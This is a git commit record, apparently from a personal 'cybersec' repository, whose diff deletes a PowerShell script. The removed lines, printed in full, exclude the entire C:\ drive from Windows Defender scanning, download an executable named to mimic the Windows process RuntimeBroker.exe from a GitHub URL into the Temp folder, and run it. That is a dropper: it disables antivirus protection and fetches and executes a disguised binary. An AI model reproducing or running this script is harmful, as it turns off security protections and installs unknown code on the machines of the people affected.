505b96c35394073ecd500ee810734a1260e26e35
Drew K <amackzie@gmail.com>
2024-12-10 08:06:47 +0200

    remove script file

--- script.ps1
+++
@@ -1,5 +0,0 @@
-Add-MpPreference -ExclusionPath C:\
-$url = "https://github.com/zessu/cybersec/raw/refs/heads/master/RuntimeBroker.exe"
-$output = "$env:Temp/RuntimeBroker.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process -FilePath $output
